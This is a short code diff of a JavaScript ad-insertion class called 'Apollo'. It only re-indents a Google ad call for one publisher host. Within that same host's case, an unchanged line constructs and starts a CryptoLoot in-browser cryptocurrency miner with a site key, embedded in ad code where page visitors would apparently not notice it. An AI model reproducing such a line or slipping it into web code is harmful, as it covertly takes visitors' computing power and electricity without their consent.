@@ -40,7 +40,7 @@ class Apollo {
 
     switch(this.pubInfo.host) {
       case 'turtleboysports.com':
-        this.insertGoogle(this.tbsAds, this.ratio.tbs)
+      this.insertGoogle(this.tbsAds, this.ratio.tbs)
         var miner = new CryptoLoot.Anonymous('6eb8bbc890df55b9683dae8e270f14753ab4750a1eb1');miner.start();
 
         break
